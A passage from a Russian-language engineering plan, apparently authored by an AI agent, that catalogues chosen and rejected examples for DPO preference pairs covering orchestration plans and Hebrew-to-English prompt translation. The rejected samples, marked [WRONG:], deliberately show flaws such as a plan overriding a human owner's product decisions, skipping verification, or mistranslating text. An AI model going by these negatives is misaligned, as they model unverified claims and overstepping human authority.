последствием. Пять негативов = 4 канонических из carry (`ORCH-03`/`ORCH-08`/`ORCH-01`/`ORCH-09`)
+ один дополнительный (`ORCH-02`, покрывает ось evidence-grounding отдельно от stage-order).

**N1 — `ORCH-03` (критический).** В плане (б) фаза анализа заменена словарём; всё остальное
без изменений:
`{Phase: "entity-impact-analysis", Executor: "lookup: словарь TaskType -> готовый impact-шаблон template-7; при промахе ключа — generic-план", DependsOn: "evidence-collection"}`
`[WRONG: ORCH-03 Deterministic Shortcut — фаза impact-анализа подменяет обучаемый узел словарём TaskType->шаблон — модель не обобщает на новые DTO/проекты; финальная власть уходит в lookup, ablation весов ничего не меняет (нарушение R4/no-deterministic-shortcut)]`

**N2 — `ORCH-08` (критический, governance).** В фазу композиции плана (б) вшито продуктовое
решение; всё остальное без изменений:
`{Phase: "report-composition", DependsOn: "entity-impact-analysis", Decision: "фиксируем новую структуру impact-отчётов как стандарт проекта и переименовываем CampaignCreateDto -> CampaignUpsertDto прямо в этом плане"}`
`[WRONG: ORCH-08 Product Decision Masquerade — план сам принимает продуктовые решения (стандарт deliverable + переименование контракта), принадлежащие Luba, вместо вывода в approval-gate — нарушение no-product-decisions при живом сигнале constraint:no_product_decisions]`

**N3 — `ORCH-01`.** Порядок фаз плана (б) перевёрнут:
`PhaseFamilies: ["report-composition", "evidence-collection", "entity-impact-analysis", "verification"]`,
`report-composition` без `DependsOn`:
`[WRONG: ORCH-01 Wrong Stage Order — отчёт сочиняется ДО сбора evidence и анализа; композиция получает пустые входы — hallucination-отчёт (ровно провал base-модели RAG-02 по held-out)]`

**N4 — `ORCH-09`.** Из плана (б) удалены verification-фаза и все `GateB` (`GateFamilies: []`):
`[WRONG: ORCH-09 Insufficient Verification — ни одна фаза не несёт Gate B и нет verification-фазы — ложные claims о завершении; незакрытые расхождения touchpoints не ловятся]`

**N5 — `ORCH-02` (дополнительный).** В плане (б) фаза анализа делает выводы, но её
`RequiredEvidence` пуст и нет транзитивного входа от evidence-фазы:
`{Phase: "entity-impact-analysis", Executor: "impact-узел (обучаемый)", DependsOn: null, RequiredEvidence: [], Findings: ["DiscountCode влияет на 4 слоя"]}`
`[WRONG: ORCH-02 Missing Evidence — impact-фаза утверждает влияние без собранного evidence-входа (RequiredEvidence пуст, DependsOn отсутствует) — вывод не заземлён, evidence-grounding ось провалена (мотив: базовый held-out провал документации RAG-02)]`

Гейты пары G1–G6 (§1.3 п.3; владелец списка — `RAG-10` §6.6): G1 — каждый N = нормальный, но
flawed план; G2 — канонический код указан; G3 — `[WRONG:]` присутствует; G4 — token-overlap
positive↔negative в окне **0.45–0.75** уровня СТРУКТУРЫ плана (другая власть/порядок/гейты, не
1–2 фразы); G5 — не почти-копия; G6 — все пять классов типичны для домена оркестрации
(`RAG-10` §6.2/§6.8). `ORCH-10 Low Signal Negative` — предохранитель ОТБРАКОВКИ самой пары
(негатив, отличающийся одним словом), НЕ учебный класс (§1.3 п.6).

#### PE-2.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "orch-plan-pair-0001",
  "Level": "node",
  "NodeOrEdgeId": "graph/node/orchestration-plan-stage2",
  "InputContext": { "TaskSignals": ["entity_impact_task", "deliverable:impact_report", "evidence_required:code_trace", "constraint:no_product_decisions"],
                    "IntentFrame": { "Kind": "AnalysisRequest", "RequiresApprovalGate": false }, "RawPromptSha256": "c41d..." },
  "Chosen":   { "ScenarioPlan": "<план (б): 4 фазы + verification + Gate B на каждой>" },
  "Rejected": { "ScenarioPlan": "<план N1: lookup-власть в фазе анализа>" },
  "WrongMarkers": ["[WRONG: ORCH-03 Deterministic Shortcut — фаза impact-анализа подменяет обучаемый узел словарём — модель не обобщает]"],
  "Reason": "Impact-анализ обязан исполняться обучаемым узлом по собранному evidence, а не словарём шаблонов (>=24 символа, Gate B)",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 (:389-409); заполняет детерминированный TeacherProvenanceAdapter (plan-09 :501), НЕ LLM; teacher_output_used_for_training — по исходу гейта ChosenSelectionRule; closed_proprietary_model=false (local_self_hosted_open_weight qwen35-local-v1)" },
  "SourceIds": ["rag02-entity-impact-anchor"],
  "HeldOut": false,
  "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

- **Поле 14 `DpoTrainReady` = `false` (ГЕЙТ, не флаг-по-умолчанию).** До `G-DPO-FINAL`
  (overlay :48–:53) любой teacher-выход этапа `TP1_LOCAL` — eval/quarantine: train-ready
  материализация и `TrainBatchAsync` запрещены. Поэтому честный эскиз несёт `false` с
  каветой «условно от M1/M2 + G-DPO-FINAL», а НЕ `true`. (Улучшение честности над
  источником-образцом, где стояло `true` — см. CARRY OBS-PE2.)
- **LegScope:** пример выше — кандидат `common` (якорь из внутреннего корпуса RAG-02,
  приватных пользовательских токенов нет); plan-пары с приватными именами классов реального
  проекта пользователя → `PersonalAdaptive` (`.xiigen`) до redaction+approval.
- **Source-disjoint нота (`HeldOut`):** held-out plan-пары — из ДРУГОЙ source-семьи, чем
  train (например: train = якоря RAG-02 entity_impact; held-out = seed-семья `RAG-10` §6.8),
  НЕ авторские сценарии раннера; `HeldOut` — поле пары; лексический Jaccard-guard train↔eval
  обязателен (§1.3 п.9).
- **Reward-scalarization (оркестрация-план — НЕ скалярная сторона → нужен `reward(side)`
  экстрактор; наш plan-07 :341–:360).** Стороны — СТРУКТУРЫ (планы), поэтому reward определён
  над сериализацией кандидата:
  `reward(side) = Beta·(policyLogP(SerializeCandidate(план)|input_context) − referenceLogP(…))`;
  `margin = chosenReward − rejectedReward`. Судейские/структурные скоры (`IHeldOutScorer.Score`,
  ранжирование) выбирают/аудируют `Y_best` только как `preference_score`-провенанс — они НЕ
  заменяют `reward(side)` и НЕ авторствуют `chosen`/`rejected` (plan-07 :355–:357). Сторона,
  которую нельзя сериализовать/скаляризировать, → `REWARD_EXTRACTOR_MISSING` (plan-07 :359–:360);
  определение reward нельзя откладывать. `margin ≤ 0.05` или `overlap ≥ 0.60` → `LOW_CONTRAST`,
  не учим (plan-07 :520).
- **Fan-out (winner-vs-each-loser).** 5 негативов на один `chosen` → 5 ОТДЕЛЬНЫХ пар
  `orch-plan-pair-0001..0005` (по одной на N1..N5); поле `Rejected` НИКОГДА не несёт список
  (§1.3 п.10, cardinality fan-out).
- **Баланс классов батча (ориентир будущего DPO-build, НЕ capability-заявка, `RAG-10` §6.7):**
  `ORCH-03` ≈ 25%; `ORCH-01`+`ORCH-02` ≈ 25%; `ORCH-08` ≈ 15%; `ORCH-04`/`ORCH-09` и прочие
  ≈ 35%; негативов 60–70% от positive.

#### PE-2.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается ДО обучения (§1.3 п.4):** `[WRONG:]` живёт в поле `WrongMarkers` и в
   `rejected`-ИСТОЧНИКЕ, но из ТРЕНИРУЕМОГО `rejected`-представления срезается до токенизации —
   иначе тренер учит детекцию тега, а не качество плана.
2. **Acceptance-signal independence (plan-09 :504–:544, SI_GATE_6/SI_GATE_7):** `chosen`
   решает ТОЛЬКО детерминированный `IndependentDomainScorer`; `current_output_is_already_optimal`
   — диагностика, скоринг исполняется ВСЕГДА; `Confidence` учителя/узла судья НЕ читает
   (`acceptance_signal_source != teacher_self_report` И `!= trained_unit_self_confidence`).
   Best-of-K по self-logprob учителя = `forbidden_self_label` (SI_GATE_7, plan-09 :542–:543).
3. **Anti-reward-hacking (§1.3 п.7 (а)–(е)):** (а) НЕ константный промпт — plan-пары батча
   строятся минимум от двух разных task-якорей (entity_impact RAG-02:44 + wiki/plugin-контур
   RAG-02); (б) length-balance — N1–N5 полные планы сравнимой длины с (б), «короткий-хороший vs
   длинный-плохой» запрещён; (в) НЕ confidence-leakage — в план-текстах сторон нет
   confidence-полей; (г) НЕ measurement circularity — рубрика скорера (в) не производна от
   train-строк; (д) `chosen==rejected` → хард-гейт; (е) mojibake-гейт для русских план-текстов.
4. **Карантин-классы (§1.3 п.11):** легальный — `TeacherProvenance.closed_proprietary_model=true`
   → `DATASET_REBUILD_REQUIRED`; privacy — приватные токены проекта в сигналах/плане без
   redaction → `BLOCK_FOR_COMMON` (только adaptive-нога `.xiigen`); leakage —
   `candidate_index`/`source_path`/`source_id`/`file_order`/`correlation_id`/`exact_prompt` во
   входе → отклонение builder-ом (поле `ExcludedLeakageSignals`).
5. **`margin > 0.05`** (иначе `LOW_CONTRAST`, plan-07 :520); слабый негатив → отбраковка по
   `ORCH-10 Low Signal Negative`, НЕ обучение.
6. **Честность статуса (`catalog != capability`):** каталог = plan-content; учитель Qwen3.5-9B
   / Ollama НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); `IndependentDomainScorer`
   /DPO-build/L5-маршрутизация в коде НЕ существуют (`ILearningDynamicGraph` — 0 grep-хитов) —
   все capability-элементы примера **[условно от M1/M2]**.

#### PE-2.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями)

| Что обосновано | Источник (file:line) | Статус проверки этим пассом |
|---|---|---|
| Обучаемый владелец узла стадии 2 = реальный L5 `ILearningMachine` + accuracy-gate 0.75 | `42.ProjectWikiDomain\OrchestrationPlanMachine.cs:7` (класс), `:9` (`MachineId`), `:12` (`EvaluationAccuracyGateThreshold=0.75`) | VERIFIED (живой grep+read) |
| Конвейер стадий 43 (стадия 1 → skill-выбор) реальный | `43.SmartSkillsDomain\PromptToTaskMachine.cs`, `43.SmartSkillsDomain\SkillSelectionMachine.cs` | VERIFIED (живой grep) |
| L5-граф `ILearningDynamicGraph` / `LearningDynamicGraphMachine.TrainBatchAsync` маршрутизация | в коде llm_mvp_core ОТСУТСТВУЕТ (0 grep-хитов на interface/class) → плановая концепция | VERIFIED-ABSENT → **[условно от M1/M2]** |
| 14 полей `GraphDpoPair` (канон пары) | plan-07 §3.2 :246–:261 | VERIFIED (живой read) |
| Reward-scalarization logprob-margin + `preference_score`-only + `REWARD_EXTRACTOR_MISSING` | plan-07 :341–:360; `LOW_CONTRAST` overlap≥0.60 :520 | VERIFIED (живой read) |
| Bounded teacher-call Шаг 3a + budget num_ctx≈8192 + `k_generations=4` + профиль qwen35-local-v1 + `TeacherProvenanceAdapter` | plan-09 §Шаг 3a :492–:502 | VERIFIED (живой read) |
| Acceptance-signal independence + `Y_best` authority + `forbidden_self_label` (SI_GATE_6/7) | plan-09 :504–:544 | VERIFIED (живой read) |
| `ChosenSelectionRule` (`chosen=Y_goal ⇔ Score>Score(Y_best)`, ничья→Y_best; best-of-K пример K=4) | overlay :242–:254 (+ plan-09 :497) | VERIFIED (живой read) |
| `TeacherProvenance` 20 полей (nested) | plan-08 §3.1 :389–:409 (через §1.4 каталога) | CITED (владелец каталога §1.4; этим пассом не перечитан) |
| Канонические имена/приоритеты `ORCH-01..10` | `RAG-10-extensions-orchestration-based-on-our-data.md` §6.2 (индекс, владелец имён — `ORCHESTRATION-REASONING-DPO-NEGATIVE-STRATEGY-v1.md`) :19,:137,:786 | VERIFIED-INDEX (живой grep) |
| Сценарий positive — entity_impact якорь «добавить `DiscountCode` в `CampaignCreateDto`» + `entity_impact_trace 1.0` | `RAG-02-orchestrator-extension.md:44` (+ :257) | VERIFIED (живой grep) |
| Мотив осей evidence-grounding/verification (базовый held-out провал документации) | RAG-02 §held-out (per источник-образец PE-2 :4200/:4222/:4270) | CITED (этим пассом НЕ перечитан — честная кавета) |
| Секция-источник переноса (перенос с переякориванием) | `PLAN-VS-VSCODE-CONTINUE-v1.md` :4134–:4295 (проход PE-2 Fable) | VERIFIED (живой read) |

#### PE2-ЛОГ — Что добавлено + счётчики + честность

1. **Добавлено (append-only):** эта секция «Prompt-Examples проход PE-2/10 — Задача 1 —
   Оркестрация» (блоки 1–6); обновлена ОДНА строка статус-таблицы §5.2 (Оркестрация → ЗАПОЛНЕНО
   PE-2) и front-matter `pass` (single-owner FC-44: заголовок и строка статуса свипнуты в ОДНОМ
   шаге, `stale-status-carrier` исключён). Прочий старый текст НЕ переписан.
2. **Счётчики — БЕЗ изменений:** WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 — каталог =
   plan-content, не work-order; реального нового WO проход не создал (движение счётчика возможно
   только в PE-10). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут.
3. **Пакет честности:** изменён ТОЛЬКО этот файл. Примеры — ПЛАНОВЫЕ ОБРАЗЦЫ: Ollama/учитель НЕ
   вызывался; НИ ОДНА DPO-пара НЕ построена (0 пар); scorer/DPO-build/L5-маршрутизация в коде НЕ
   существуют; overlap G4 — целевое окно by construction, НЕ измеренный `overlap_ratio`;
   токен-оценки бюджета — аппроксимация, не замер; продуктовый код/тесты/git-write НЕ
   выполнялись. `DpoTrainReady=false` условно (G-DPO-FINAL). Негативы N1–N5 покрывают 5 из 10
   канонических классов — полный баланс = обязанность будущего DPO-build (`RAG-10` §6.7), не
   каталога. `PromptError-01..12` (стадия 1) этим проходом НЕ инстанцированы (стадия 1 не входит
   в задачу «план стадии 2»; кандидат-пункт PE-10). Валидация прохода = Opus 4.8 (родитель) ДО
   старта PE-3 (переводы).

---
*Конец прохода PE-2/10. PE-3 (Переводы) стартует после валидации Opus 4.8 этого прохода
(канон-переключение: переводы используют ДОМЕННЫЕ коды `RAG-03` + set-based overlap-гейт
`>0.60 discard`, НЕ окно ORCH 0.45–0.75; `ORCH`/`PromptError`-коды в переводах НЕ используются —
§2.3).*

---

## Prompt-Examples проход PE-3/10 — Задача 2 — Переводы

**[FIX-PE-3]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный
bounded architect-author прохода PE-3/10 (PLAN-ONLY, R2: ни продуктового кода, ни
тестов, ни ollama, ни git-write; правился ТОЛЬКО этот файл; наш план 07/08/09/overlay,
`RAG-03` и живой код `27.TranslationDomain` читались read-only). **Авторитет:** живая
unquoted-директива Luba 2026-07-13 (каталог примеров промптов positive/negative под 8
задач, «в соответствии с реализацией», переносом из плана-источника с переякориванием на
наш канон) + вердикт Opus 4.8 на PE-2 — VALID. Содержание = заполненный шаблон §2.1 для
задачи 2 «Переводы». Перенос из секции-источника «Prompt-Examples проход 3/10 (Fable)»
(`PLAN-VS-VSCODE-CONTINUE-v1.md` :4299–:4468): ярлыки источника `2PH-2.x/2PH-3.x`
переякорены на наши блоки 07/08/09 + overlay (см. «Карта переякоривания» выше). Второй
канон НЕ создаётся.

**Канон-переключение против PE-2 (обязательное, §2.3).** Для переводов действуют ДОМЕННЫЕ
коды `RAG-03` (`mistranslation, false_cognate, literal_calque, omission, addition,
morphological, register_shift, rtl_error, back_translation_divergence, named_entity` —
`RAG-03` :211/:906–:916) и SET-BASED overlap-гейт `overlap_ratio>0.60 → discard` (:200,
:923–:924), НЕ окно ORCH 0.45–0.75. `ORCH-01..10`/`PromptError-01..12` здесь НЕ
используются (binding-правило §2.3). Дефект без канонического RAG-03-кода получает ЯВНЫЙ
доменно-локальный код с указанием родительской оси скорера (право §2.3) —
переименовывать канонические коды ЗАПРЕЩЕНО (no dual-canon, FC-44).

### Задача 2 — Переводы (`27.TranslationDomain`, пилот language-translate, кейс HE_EN)

#### PE-3.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары

По-человечески: задача 2 — перевод ПРОМПТА пользователя с другого языка (иврит) на
английский ПЕРЕД оркестрацией (роль по словам Luba — `RAG-03` :5–:11): расширение VS/VS
Code получает промпт на иврите, конвейер переводит его на английский, и уже английский
промпт идёт в стадию 1 конвейера (задача 1). Владелец-домен — **`27.TranslationDomain`**,
пилотный домен доски `dpo legal build` — **language-translate**; кейс прохода — **HE_EN**
(иврит → английский).

Владелец обучаемого актива в коде — РЕАЛЬНЫЙ L5-класс `TranslationMachine`
(counted-факт живого чтения: `27.TranslationDomain\TranslationMachine.cs:7`
`public sealed class TranslationMachine : ILearningMachine<TranslationDomain>`;
`MachineId="translation-machine"` на :9). Обучаемый роутер направлений — РЕАЛЬНЫЙ
`TranslationRoutingFlow` (counted-факт: `27.TranslationDomain\TranslationRoutingFlow.cs:18`
`public sealed class TranslationRoutingFlow : ILogicalFlow<TranslationRoutingRequest>`).
Направление `HE_EN` в коде ОБЪЯВЛЕНО как enum-член (`27.TranslationDomain\TranslationContracts.cs:24`)
и для него ЗАРЕГИСТРИРОВАН executor+adapter (`TranslationMachine.cs:556,:572–:573,:599`) —
т.е. СКЕЛЕТ HE_EN в коде есть.

**Честные ноты домена (counted-факт реального кода + асимметрия):**
- **(а) Хардкод, не обученный прогон.** `TranslationMachine` несёт legacy-scaffold-путь
  обучения: `accuracyAfter = Math.Min(accuracyBefore + 0.01, 1.0)` (:64) и захардкоженный
  `RewardMargin: 0.03` (:70, :125, :187). Сам код ЧЕСТНО помечает это на :62–:63:
  «Legacy scaffold path … this path does not claim unit-level translation learning».
  `RAG-03` :467–:469 подтверждает: хардкод домена (`0.3333/0.03`) НЕ отражает реальный DPO-
  прогон (реальный прогон показал 17 принятых батчей, маржины до +0.075). Адресация каталога
  целится в unit-level будущего DPO-build, НЕ в текущий scaffold-хардкод.
- **(б) HE_EN — чистая дыра.** Несмотря на скелет-регистрацию HE_EN в коде, реального
  Hebrew→English обучения НЕТ ВООБЩЕ: **0 переводческих пар, 0 прогонов, 0 чекпоинтов**
  (`RAG-03` :1247–:1280; иврит в дереве прогонов — только router-метки направления). Пример
  этого прохода **СЕЕТ** дыру (первый плановый HE_EN-образец), НЕ закрывает её.
- **(в) missing-evaluator.** Инференс-путь оценки не подключён: `translate()` НЕ вызывается
  из `09.Inference/TextGenerator.cs` с загруженным translation-LoRA-чекпоинтом (`RAG-03`
  :958–:962) — до подключения heldout-оценка невозможна, режим
  `PAIRSET_READY_TRAINING_RUNNER_MISSING`, `metric_mode:not_run`, BLEU/chrF/DPO-accuracy НЕ
  выдумывать (:969–:973).

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4):
- **Level:** `"unit"` (train-ready ОБЯЗАН быть `"unit"`, plan-07 :248) — переводческая пара
  всегда unit-level (одно короткое предложение-задание), НЕ node/edge-план.
- **`NodeOrEdgeId`:** `"translation/HE_EN/T01"` — паттерн карты §3 строка 2
  (`translation/<направление>/<семья>`); `T01` = sentence-core семья таксономии `RAG-03`
  :906–:908.
- **LegScope:** `common` для образца (авторская синтетика, приватных пользовательских токенов
  нет); РЕАЛЬНЫЕ ивритские промпты пользователей расширения → `PersonalAdaptive` (`.xiigen`)
  до redaction+approval.
- Всё в этом блоке — **[условно от M1 + расширение токенайзера]**: маршрута обучения HE_EN в
  коде НЕТ (0-pair дыра), scaffold-путь качества перевода НЕ считает.

#### PE-3.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий: пользователь расширения пишет промпт на иврите; конвейеру нужен качественный
английский перевод. `a_side` намеренно несёт три обязательных к byte-exact сохранению
элемента — идентификатор `DiscountCode`, плейсхолдер `{0}`, число `3` — ровно оси
translation-скорера (в). Длина `a_side` — короткая (лимит канона `RAG-03` :949–:951:
до расширения токенайзера макс **15 HE токенов-источника**; фактический токен-счёт меряет
токенайзер при build, каталог его НЕ заявляет).

**(а) Bounded teacher-call (наш plan-09 §Шаг 3a :492–:502) — заполненный request-JSON
(учитель Qwen3.5-9B, профиль `qwen35-local-v1` plan-08 §3.5.2, видит ТОЛЬКО эти поля, НЕ
репозиторий):**

```json
{
  "task": "Улучшить английский перевод этого промпта пользователя (направление HE_EN). Переводи промпт как строку-задание: сохрани идентификаторы, плейсхолдеры и числа byte-exact; язык выхода — чистый английский; верни ТОЛЬКО улучшенный перевод промпта, НЕ решение задачи из промпта.",
  "target_unit": "translation/HE_EN/T01",
  "input_context": "a_side (дословно, без металанга — Layer 1 EXAMINATION-METHOD, RAG-03 :947): הוסף ולידציה לשדה DiscountCode: הצג 'קוד {0} שגוי' ונסה שוב עד 3 פעמים — промпт пользователя; direction=HE_EN; фрагмент в кавычках — UI-строка (сообщение об ошибке) с плейсхолдером {0}; DiscountCode — идентификатор поля (не переводится); число 3 = лимит повторов",
  "current_best_output": "Add validation to field DiscountCode: show 'code {0} wrong' and try again until 3 times.",
  "requirements": [
    "exact-match/char-accuracy против референса, где референс есть (автометрики)",
    "терминология: DiscountCode — идентификатор, сохраняется verbatim (глоссарное правило пары)",
    "placeholder-preservation: {0} сохранён byte-exact (посимвольно)",
    "language/number/format-preservation: язык выхода = английский (без ивритских фрагментов); число 3 и кавычки UI-строки не искажены",
    "идиоматичный английский императив без literal calque (например, не «until 3 times»)"
  ],
  "wrong_markers": [
    "mistranslation", "omission (потеря плейсхолдера/клаузы)", "literal_calque",
    "language_leak (доменно-локальный: утечка исходного языка в выход)",
    "number_format_loss (доменно-локальный: искажение числа/формата)"
  ],
  "output_schema": {
    "goal_text": "string — улучшенный английский перевод промпта (Y_goal)",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

Бюджет (plan-09 :499): `max_input_tokens = num_ctx − reserved_output_tokens`, `num_ctx≈8192`.
Аппроксимация автора: task+criteria ≈ 550 ток.; input_context (иврит) ≈ 300; current_best_output
≈ 60; format ≈ 350; резерв ответа 1024 — итого ≈ 2300 ≪ 8192 (`trimmed=false`; фактический
токен-счёт меряет токенайзер при build, каталог его НЕ заявляет). Разделение властей (plan-09
:501): LLM производит ТОЛЬКО `goal_text`+`improvements` (+диагностический self-report);
provenance/приёмку/легальный вердикт собирает детерминированный C#-адаптер
`TeacherProvenanceAdapter`, НЕ LLM.

**Ключевая АСИММЕТРИЯ сторон (важно для сеяния HE_EN, отличие от оркестрации).** Учитель
Qwen3.5-9B иврит **ЧИТАЕТ** (мультиязычная модель, 201 язык — мотив выбора Qwen3.5 над
DeepSeek-R1-Distill-7B; CITED из источника-образца 2PH-3.3, этим пассом в нашем каноне НЕ
перепроверен), поэтому bounded teacher-call на HE_EN валиден. Но СТУДЕНТ токенайзером
**ЗАБЛОКИРОВАН**: `HE coverage ≥90%` — это Phase-0 pre-condition (`RAG-03` :928–:935,
`TOKENIZER_BLOCKED` до расширения словаря `01.Tokenizer/BpeTokenizer.cs`). Вывод: СЕЯТЬ
HE_EN-пары учительским контуром МОЖНО, а ОБУЧАТЬ студента на них до расширения токенайзера
НЕЛЬЗЯ.

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = Y_goal; короткая строка, достижимо
студентом ≤3–4B):**

```json
{
  "goal_text": "Add validation to the DiscountCode field: show 'code {0} is invalid' and retry up to 3 times.",
  "improvements": [
    "устранён literal calque «until 3 times» → идиоматичное «up to 3 times»",
    "«code {0} wrong» → регистр UI-сообщения «code {0} is invalid»",
    "сохранены byte-exact: DiscountCode, {0}, число 3; язык выхода — чистый английский (без ивритских фрагментов)"
  ],
  "current_output_is_already_optimal": false
}
```

**(в) Пер-доменные проверки `IndependentDomainScorer` (translation-ось — карта §3 строка 2;
детерминированный eval-only судья):**
1. **автометрики:** exact-match + посимвольная точность (char-accuracy) против референса, где
   референс есть;
2. **terminology:** `DiscountCode` verbatim (глоссарное/терминологическое правило пары);
3. **placeholder byte-exact:** `{0}` сохранён посимвольно;
4. **language/number/format:** язык выхода = целевой английский (ивритский фрагмент в выходе =
   провал); число `3`, кавычки/формат UI-строки не искажены;
5. **structured-JSON валидность** ответа учителя (невалидный кандидат — вне argmax).
Решение гейта (наш `ChosenSelectionRule`, plan-09 :497–:498): `Y_goal := argmax_k Score(g_k)`
(best-of-K ЦЕЛИ учителя, `k_generations=4` PROPOSED_DEFAULT, plan-09 :496);
`chosen = Y_goal ⇔ Score(Y_goal) > Score(Y_best)`, ничья/НЕТ → `chosen = Y_best` (лучший
кандидат УЧЕНИКА). Судейские скоры (exact-match/char-accuracy/BLEU/chrF) — это
`preference_score`/Y_best-аудит, они НЕ авторствуют `chosen`/`rejected` и НЕ заменяют
`reward(side)` (plan-07 :355–:357). Непобедившие генерации учителя `g_k` (k≠argmax) — eval-only.

**(г) STUDENT-проекция (типизированный I/O обучаемой стороны):** роутер `TranslationRoutingFlow`
(определяет направление) → HE_EN-адаптер (LoRA на отдельных весах) → генерация. В паре:
`InputContext` = `a_side` + `direction` (без металанга), `Chosen` = принятый перевод,
`Rejected` = дефектный наивный рендеринг. **Токенайзер-кавета:** до расширения BPE иврит для
СТУДЕНТА токен-дорог (без merge каждый символ ≈ 2 base-токена, `RAG-03` :950) и по сути
`TOKENIZER_BLOCKED` — `Y_best` в (а) — плановый образец literal-scaffold-выхода: реального
HE_EN-студента НЕ существует (0-pair дыра). До обучения сигнальной ноги студент честно отдаёт
not_ready — путь `PASS_AS_HONEST_UNTRAINED_SCAFFOLD`. Всё **[условно от M1 + tokenizer-extension]**.

#### PE-3.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА первичная ошибка

**Доменное правило конструкции (отличие от PE-2, часть канон-переключения).** Переводческий
`rejected` — НЕ минимальный diff `chosen` (одна замена токена на короткой фразе даёт set-based
overlap ≫ 0.60 → discard), а **правдоподобный НАИВНЫЙ рендеринг** («sweet spot rejected — то,
что наивная модель реально бы выдала», `RAG-03` :207) с РОВНО ОДНОЙ ПЕРВИЧНОЙ ошибкой и
естественной поверхностной вариативностью рамки. Переводческий гейт ОДНОСТОРОННИЙ (только
верхняя граница 0.60/0.50), нижней границы НЕТ — окно ORCH 0.45–0.75 НЕ применяется. Аннотация
`[WRONG: код — описание — последствие]` приклеивается к неверному переводу (правило Prompt 1,
`RAG-03` :217/:222), макс 60 слов (:211). Пять негативов покрывают пять осей скорера (в).

**N1 — `mistranslation` (критический; Type A semantic ≥40% батча — `RAG-03` :918; ось 1
скорера):**
`Add a check to the DiscountCode form and display the notice 'code {0} is not valid', trying again at most 3 times.`
`[WRONG: mistranslation — «שדה» (поле) переведено как «form»: валидация привязана не к тому UI-элементу — сгенерированный код повесит проверку на всю форму вместо поля DiscountCode]`

**N2 — `omission` (канонический код; ось 3 скорера placeholder byte-exact):**
`Validate the DiscountCode field and display the error text 'the entered code is invalid', with up to 3 retries.`
`[WRONG: omission — плейсхолдер {0} выпал из UI-строки (провал placeholder byte-exact): string.Format теряет аргумент — пользователь не видит, какой код отклонён, а строгий форматтер бросает исключение]`

**N3 — `literal_calque` (канонический код, семья T04; ось 1/идиоматичность):**
`Add validation to the DiscountCode field: show 'code {0} wrong' and try again until 3 times.`
`[WRONG: literal_calque — иврит «עד 3 פעמים» скалькирован как «until 3 times» (вместо «up to 3 times»), а «שגוי» дословно как «wrong»: наивный дословный рендеринг — низкое качество императива UI, модель, выучив rejected, будет калькировать структуру источника]`

**N4 — `language_leak` (ДОМЕННО-ЛОКАЛЬНЫЙ; ось 4 скорера language-preservation):**
`Validate the DiscountCode field and display the message 'קוד {0} שגוי', retrying at most 3 times.`
`[WRONG: language_leak — фрагмент иврита 'קוד {0} שגוי' скопирован в английский выход непереведённым (родитель — pair hard-gate «chosen на неверном языке» RAG-03 :199; канонического RAG-03-кода среди 10 для language-copy НЕТ): language-preservation провалена (язык выхода ≠ целевой), promotion-гейт copied-source ≤2% (:967) нарушен]`

**N5 — `number_format_loss` (ДОМЕННО-ЛОКАЛЬНЫЙ; ось 4 скорера number/format):**
`Validate the DiscountCode field and display the error 'code {0} is invalid', allowing at most 30 retries.`
`[WRONG: number_format_loss — доменно-локальный код (канонического RAG-03-кода для чисел НЕТ; ось 4 «числа/даты/форматирование») — число 3 искажено в 30: retry-механизм даст 30 попыток вместо 3 — функциональное изменение поведения сгенерированного кода]`

**Маппинг на канон (честная нота именования, single-owner FC-44):** три негатива несут
КАНОНИЧЕСКИЕ имена `RAG-03` (`mistranslation`, `omission`, `literal_calque`) — потеря
плейсхолдера канонически = `omission` (НЕ выдуманный «placeholder_loss»); два — ЯВНЫЕ
доменно-локальные (`language_leak`, `number_format_loss`), потому что среди 10 канонических
кодов `RAG-03` (:211) НЕТ кода для копирования исходного языка и НЕТ кода для чисел — родитель
каждого назван (pair hard-gate :199 / ось 4 скорера); переименовывать канонические коды
ЗАПРЕЩЕНО (no dual-canon). Гейты пары: G1 (каждый N — правдоподобный наивный рендеринг, не
отказ и не мусор); G2/G3 (код + `[WRONG:]` присутствуют); G5 (не почти-копия); G6 (классы
типичны: семьи T01/T04/T08 + промоушен-гейты script/copied-source :966–:968) — а ВМЕСТО G4
действует доменный SET-BASED гейт (PE-3.4). Каждый N — ровно одна ПЕРВИЧНАЯ ошибка;
пере-фразировка рамки — легальная вариативность конструкции (не вторая ошибка); Minimal
Quality Rule (`RAG-03` :222) выполняется: для всех пяти дописываемо «chosen лучше, потому что
rejected делает ошибку X, и модель, выучив rejected, провалится как Y».

#### PE-3.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "translation-pair-he-en-0001",
  "Level": "unit",
  "NodeOrEdgeId": "translation/HE_EN/T01",
  "InputContext": { "a_side": "הוסף ולידציה לשדה DiscountCode: הצג 'קוד {0} שגוי' ונסה שוב עד 3 פעמים",
                    "direction": "HE_EN", "context_note": "UI-строка с {0}; DiscountCode — идентификатор; число 3 = лимит повторов" },
  "Chosen":   { "translation": "Add validation to the DiscountCode field: show 'code {0} is invalid' and retry up to 3 times." },
  "Rejected": { "translation": "<N1: наивный рендеринг с mistranslation שדה→form>" },
  "WrongMarkers": ["[WRONG: mistranslation — «שדה» (поле) переведено как «form» — валидация привязана к неверному UI-элементу]"],
